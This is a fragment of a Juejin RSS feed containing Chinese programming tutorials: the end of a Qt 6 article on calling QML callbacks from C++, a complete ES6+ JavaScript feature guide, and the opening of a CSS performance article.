<li>用 <code>isCallable()</code> 检查是否为可调用的 JavaScript 函数（回调）；</li>
<li>用 <code>call(QJSValueList args)</code> 调用回调函数，参数通过 <code>QJSValueList</code> 传递。</li>
</ul>
<h4 data-id="heading-9">2. 线程安全（重中之重）</h4>
<ul>
<li>QML 的 <code>QJSEngine</code> 是<strong>线程关联</strong>的（默认绑定主线程），直接在后台线程调用 <code>QJSValue::call</code> 会导致崩溃；</li>
<li>解决方案：用 <code>QMetaObject::invokeMethod</code> + <code>Qt::QueuedConnection</code>，将回调调用切换到主线程执行。</li>
</ul>
<h4 data-id="heading-10">3. 自定义数据类型转 QJSValue</h4>
<ul>
<li>自定义类（如 <code>KratosError</code>、<code>LoginResponse</code>）需提供 toQJSValue 方法，通过 <code>QJSEngine::newObject()</code> 创建 JS 对象，再用 <code>setProperty</code> 设置属性；</li>
<li>QML 中可直接通过属性名访问（如 <code>error.message</code>、<code>response.token</code>），大小写敏感。</li>
</ul>
<h4 data-id="heading-11">4. 有效性检查</h4>
<ul>
<li>必须检查 <code>QJSEngine* engine = qjsEngine(this)</code> 是否为空（避免 QML 组件销毁后引擎失效）；</li>
<li>必须检查回调函数 <code>isCallable()</code>（避免传入非函数类型导致崩溃）。</li>
</ul>
<h3 data-id="heading-12">六、常见问题排查</h3>
<h4 data-id="heading-13">1. QML 无法导入 backend 模块？</h4>
<ul>
<li>检查 <code>qmlRegisterSingletonInstance</code> 的模块名、版本号与 QML import 一致；</li>
<li>确保 C++ 类继承 <code>QObject</code> 并添加 <code>Q_OBJECT</code> 宏；</li>
<li>构建时确保 MOC 文件正常生成（qmake 自动处理，CMake 需添加 <code>qt_add_qml_module</code>）。</li>
</ul>
<h4 data-id="heading-14">2. 回调函数不执行？</h4>
<ul>
<li>检查 <code>isCallable()</code> 是否返回 <code>true</code>（确认传入的是函数）；</li>
<li>检查是否在主线程调用 <code>call()</code>（后台线程调用会静默失败）；</li>
<li>检查异步逻辑是否正常执行（如模拟的 <code>QThread::sleep</code> 后是否触发回调）。</li>
</ul>
<h4 data-id="heading-15">3. 程序崩溃？</h4>
<ul>
<li>大概率是线程问题：后台线程直接操作 <code>QJSValue</code> 或 <code>QJSEngine</code>；</li>
<li>检查 <code>engine</code> 是否为空（如单例销毁后仍调用回调）。</li>
</ul>
<h3 data-id="heading-16">七、最佳实践</h3>
<h4 data-id="heading-17">1. 优先使用回调还是信号槽？</h4>
<ul>
<li><strong>回调</strong>：适合一次性操作（如登录、单次网络请求），代码直观，参数传递灵活；</li>
<li><strong>信号槽</strong>：适合多次通知（如实时数据更新），解耦性更强，支持多订阅者；</li>
<li>本文场景（登录）用回调更合适，简洁高效。</li>
</ul>
<h4 data-id="heading-18">2. 简化数据传递（可选）</h4>
<p>若数据简单，可直接用 <code>QVariantMap</code> 代替自定义类，无需写 <code>toQJSValue</code> 方法：</p>
<pre><code class="hljs language-cpp" lang="cpp">QVariantMap errorMap;
errorMap[<span class="hljs-string">"code"</span>] = <span class="hljs-number">401</span>;
errorMap[<span class="hljs-string">"message"</span>] = <span class="hljs-string">"登录失败"</span>;
onFailure.<span class="hljs-built_in">call</span>(QJSValueList{engine-&gt;<span class="hljs-built_in">toScriptValue</span>(errorMap)});
</code></pre>
<h4 data-id="heading-19">3. 避免回调地狱</h4>
<p>若存在多层回调（如登录后调用获取用户信息），可考虑用 Qt 6 的 <code>QPromise</code> + <code>co_await</code>（C++20+）或 QML 的 <code>async/await</code> 优化。</p>
<h3 data-id="heading-20">八、总结</h3>
<p>本文完整实现了 Qt 6 中 C++ 调用 QML 回调的流程，核心是：</p>
<ol>
<li>C++ 类继承 <code>QObject</code> 并暴露 <code>Q_INVOKABLE</code> 方法；</li>
<li>用 <code>QJSValue</code> 接收 QML 回调，用 <code>call()</code> 触发回调；</li>
<li>异步场景下必须切换到主线程执行回调，确保线程安全；</li>
<li>自定义数据通过 <code>QJSValue</code> 转换后传递，QML 可直接访问属性。</li>
</ol>
<p>这种方式适用于所有异步通信场景（登录、网络请求、文件读写等），是 C++ 与 QML 协作的核心技巧之一。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ES6+ 新特性解析：让 JavaScript 开发更优雅高效]]></title>    <link>https://juejin.cn/post/7576052677051416602</link>    <guid>https://juejin.cn/post/7576052677051416602</guid>    <pubDate>2025-11-24T10:21:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576052677051416602" data-draft-id="7576070987294031918" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" ES6+ 新特性解析：让 JavaScript 开发更优雅高效"/> <meta itemprop="keywords" content="ECMAScript 6,前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T10:21:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="San30"/> <meta itemprop="url" content="https://juejin.cn/user/1766294768060816"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             ES6+ 新特性解析：让 JavaScript 开发更优雅高效
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1766294768060816/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    San30
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:21:35.000Z" title="Mon Nov 24 2025 10:21:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p>ES6（ECMAScript 2015）是 JavaScript 语言发展的里程碑，引入了大量让代码更简洁、更易维护的新特性。本文将深入解析这些特性，并通过实际代码示例展示它们的强大之处。</p>
<h2 data-id="heading-0">解构赋值：优雅的数据提取</h2>
<p>解构赋值让我们能够从数组或对象中快速提取值，赋给变量。</p>
<h3 data-id="heading-1">数组解构</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 基本数组解构</span>
<span class="hljs-keyword">const</span> [a, b, c] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b, c); <span class="hljs-comment">// 1 2 3</span>

<span class="hljs-comment">// 嵌套数组解构</span>
<span class="hljs-keyword">const</span> [a, [b, c, [d], e]] = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, [<span class="hljs-number">4</span>], <span class="hljs-number">5</span>]];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b, c, d, e); <span class="hljs-comment">// 1 2 3 4 5</span>

<span class="hljs-comment">// 剩余参数解构</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> [first, ...rest] = arr;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(first, rest); <span class="hljs-comment">// 1 [2, 3, 4, 5]</span>

<span class="hljs-comment">// 实际应用：提取教练和球员</span>
<span class="hljs-keyword">const</span> users = [<span class="hljs-string">'Darvin Ham'</span>, <span class="hljs-string">'James'</span>, <span class="hljs-string">'Luka'</span>, <span class="hljs-string">'Davis'</span>, <span class="hljs-string">'Ayton'</span>, <span class="hljs-string">'Kyle'</span>];
<span class="hljs-keyword">const</span> [captain, ...players] = users;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(captain, players); 
<span class="hljs-comment">// Darvin Ham ['James', 'Luka', 'Davis', 'Ayton', 'Kyle']</span>
</code></pre>
<h3 data-id="heading-2">对象解构</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sex = <span class="hljs-string">'boy'</span>;
<span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Darvin Ham'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
    sex, <span class="hljs-comment">// 对象属性简写</span>
    <span class="hljs-attr">like</span>: {
        <span class="hljs-attr">n</span>: <span class="hljs-string">'唱跳'</span>
    }
};

<span class="hljs-comment">// 对象解构</span>
<span class="hljs-keyword">let</span> { name, age, <span class="hljs-attr">like</span>: { n } } = obj;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name, age, n); <span class="hljs-comment">// Darvin Ham 25 唱跳</span>

<span class="hljs-comment">// 字符串也可以解构</span>
<span class="hljs-keyword">const</span> [e, r, ...u] = <span class="hljs-string">'hello'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e, r, u); <span class="hljs-comment">// h e ['l', 'l', 'o']</span>

<span class="hljs-comment">// 获取字符串长度</span>
<span class="hljs-keyword">const</span> { length } = <span class="hljs-string">'hello'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(length); <span class="hljs-comment">// 5</span>
</code></pre>
<h3 data-id="heading-3">解构的实用技巧</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 交换变量（无需临时变量）</span>
<span class="hljs-keyword">let</span> x = <span class="hljs-number">1</span>, y = <span class="hljs-number">2</span>;
[x, y] = [y, x];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x, y); <span class="hljs-comment">// 2 1</span>

<span class="hljs-comment">// 函数参数解构</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">{ name, greeting = <span class="hljs-string">'Hello'</span> }</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, <span class="hljs-subst">${name}</span>!`</span>);
}
<span class="hljs-title function_">greet</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span> }); <span class="hljs-comment">// Hello, Bob!</span>

<span class="hljs-comment">// 设置默认值</span>
<span class="hljs-keyword">const</span> { name, gender = <span class="hljs-string">'unknown'</span> } = { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gender); <span class="hljs-comment">// unknown（因为 user 中没有 gender 属性）</span>
</code></pre>
<h2 data-id="heading-4">模板字符串：更优雅的字符串处理</h2>
<p>模板字符串使用反引号(``)定义，支持多行字符串和插值表达式。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> myName = <span class="hljs-string">'zhangsan'</span>;

<span class="hljs-comment">// 传统字符串拼接</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello, i am '</span> + myName);

<span class="hljs-comment">// 模板字符串</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`hello, i am <span class="hljs-subst">${myName}</span>`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`hello, i am <span class="hljs-subst">${myName.toUpperCase()}</span>`</span>);

<span class="hljs-comment">// 多行字符串</span>
<span class="hljs-keyword">const</span> message = <span class="hljs-string">`
  亲爱的 <span class="hljs-subst">${myName}</span>:
  欢迎使用我们的服务！
  祝您使用愉快！
`</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);
</code></pre>
<h2 data-id="heading-5">更现代的循环：for...of</h2>
<p><code>for...of</code> 循环提供了更好的可读性和性能。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> myName = <span class="hljs-string">'zhangsan'</span>;

<span class="hljs-comment">// for...of 遍历字符串</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> x <span class="hljs-keyword">of</span> myName) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 依次输出: z h a n g s a n</span>
}

<span class="hljs-comment">// 与 for 循环对比</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// 传统的 for 循环</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr[i]);
}

<span class="hljs-comment">// 更简洁的 for...of</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> item <span class="hljs-keyword">of</span> arr) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item);
}
</code></pre>
<blockquote>
<p><strong>性能建议</strong>：<code>for...of</code> 语义更好，可读性更强，性能也不会比计数循环差太多。而 <code>for...in</code> 性能较差，应尽量避免使用。</p>
</blockquote>
<h2 data-id="heading-6">BigInt：处理大整数的新数据类型</h2>
<p>JavaScript 的数字类型有精度限制，最大安全整数是 2^53-1。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// JavaScript 的数字精度问题</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Number</span>.<span class="hljs-property">MAX_SAFE_INTEGER</span>); <span class="hljs-comment">// 9007199254740991</span>

<span class="hljs-keyword">let</span> num = <span class="hljs-number">1234567890987654321</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 1234567890987654400（精度丢失！）</span>

<span class="hljs-comment">// 使用 BigInt</span>
<span class="hljs-keyword">let</span> num2 = <span class="hljs-number">1234567890987654321n</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num2, <span class="hljs-keyword">typeof</span> num2); <span class="hljs-comment">// 1234567890987654321n 'bigint'</span>

<span class="hljs-comment">// BigInt 运算</span>
<span class="hljs-keyword">const</span> big1 = <span class="hljs-number">9007199254740991n</span>;
<span class="hljs-keyword">const</span> big2 = <span class="hljs-number">1n</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(big1 + big2); <span class="hljs-comment">// 9007199254740992n</span>

<span class="hljs-comment">// 注意事项</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1n</span> + <span class="hljs-number">2</span>); <span class="hljs-comment">// ❌ TypeError: Cannot mix BigInt and other types</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(<span class="hljs-number">16n</span>)); <span class="hljs-comment">// ❌ TypeError</span>
<span class="hljs-keyword">const</span> x = <span class="hljs-number">3.</span><span class="hljs-number">14n</span>; <span class="hljs-comment">// ❌ SyntaxError: Invalid or unexpected token</span>
</code></pre>
<h3 data-id="heading-7">BigInt 使用要点：</h3>
<ul>
<li>使用 <code>n</code> 后缀表示 BigInt 字面量</li>
<li>不能与 Number 类型直接混合运算</li>
<li>不能使用 Math 对象的方法</li>
<li>只能表示整数，不支持小数</li>
</ul>
<h2 data-id="heading-8">函数参数的增强</h2>
<h3 data-id="heading-9">默认参数</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">x = <span class="hljs-number">1</span>, y = <span class="hljs-number">1</span></span>) {
    <span class="hljs-keyword">return</span> x + y;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">foo</span>(<span class="hljs-number">3</span>)); <span class="hljs-comment">// 4 (使用默认值 y=1)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">foo</span>(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)); <span class="hljs-comment">// 8</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">foo</span>()); <span class="hljs-comment">// 2 (使用默认值 x=1, y=1)</span>
</code></pre>
<h3 data-id="heading-10">剩余参数 vs arguments</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">...args</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'剩余参数:'</span>, args, <span class="hljs-keyword">typeof</span> args); 
    <span class="hljs-comment">// [1, 2, 3, 4] 'object'</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'是数组吗:'</span>, <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(args)); <span class="hljs-comment">// true</span>
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'arguments:'</span>, <span class="hljs-variable language_">arguments</span>, <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">arguments</span>); 
    <span class="hljs-comment">// [Arguments] { '0': 1, '1': 2, '2': 3, '3': 4 } 'object'</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'arguments是数组吗:'</span>, <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(<span class="hljs-variable language_">arguments</span>)); <span class="hljs-comment">// false</span>
    
    <span class="hljs-comment">// 剩余参数支持数组方法</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'参数个数:'</span>, args.<span class="hljs-property">length</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'参数总和:'</span>, args.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>));
}

<span class="hljs-title function_">foo</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);
</code></pre>
<h3 data-id="heading-11">剩余参数的优势：</h3>
<ul>
<li>是真正的数组，可以使用所有数组方法</li>
<li>更清晰的语法</li>
<li>更好的类型推断（TypeScript）</li>
</ul>
<h2 data-id="heading-12">其他实用特性</h2>
<h3 data-id="heading-13">指数运算符</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ES7 (2016) 引入的指数运算符</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span> ** <span class="hljs-number">10</span>); <span class="hljs-comment">// 1024</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span> ** <span class="hljs-number">3</span>); <span class="hljs-comment">// 27</span>

<span class="hljs-comment">// 替代 Math.pow()</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>)); <span class="hljs-comment">// 1024 (传统方式)</span>
</code></pre>
<h3 data-id="heading-14">对象属性简写</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> name = <span class="hljs-string">'Alice'</span>;
<span class="hljs-keyword">const</span> age = <span class="hljs-number">25</span>;

<span class="hljs-comment">// 传统写法</span>
<span class="hljs-keyword">const</span> obj1 = {
    <span class="hljs-attr">name</span>: name,
    <span class="hljs-attr">age</span>: age
};

<span class="hljs-comment">// ES6 简写写法</span>
<span class="hljs-keyword">const</span> obj2 = {
    name,
    age
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2); <span class="hljs-comment">// { name: 'Alice', age: 25 }</span>
</code></pre>
<h2 data-id="heading-15">总结</h2>
<p>ES6+ 的新特性让 JavaScript 开发变得更加优雅和高效：</p>
<ul>
<li><strong>解构赋值</strong> 让数据提取更直观</li>
<li><strong>模板字符串</strong> 让字符串处理更简洁</li>
<li><strong>for...of</strong> 提供更好的循环体验</li>
<li><strong>BigInt</strong> 解决大整数计算问题</li>
<li><strong>函数参数增强</strong> 提供更灵活的函数设计</li>
</ul>
<p>这些特性不仅提高了开发效率，也让代码更易读、易维护。建议在实际项目中积极采用这些现代 JavaScript 特性，提升代码质量。</p>
<blockquote>
<p><strong>学习建议</strong>：从解构赋值和模板字符串开始，逐步掌握其他特性，让 ES6+ 成为你的开发利器！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端性能优化之CSS篇]]></title>    <link>https://juejin.cn/post/7575655132755591187</link>    <guid>https://juejin.cn/post/7575655132755591187</guid>    <pubDate>2025-11-23T13:03:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132755591187" data-draft-id="7575442779039350826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端性能优化之CSS篇"/> <meta itemprop="keywords" content="前端,JavaScript,性能优化"/> <meta itemprop="datePublished" content="2025-11-23T13:03:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员小寒"/> <meta itemprop="url" content="https://juejin.cn/user/694547078987287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端性能优化之CSS篇
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547078987287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员小寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T13:03:58.000Z" title="Sun Nov 23 2025 13:03:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
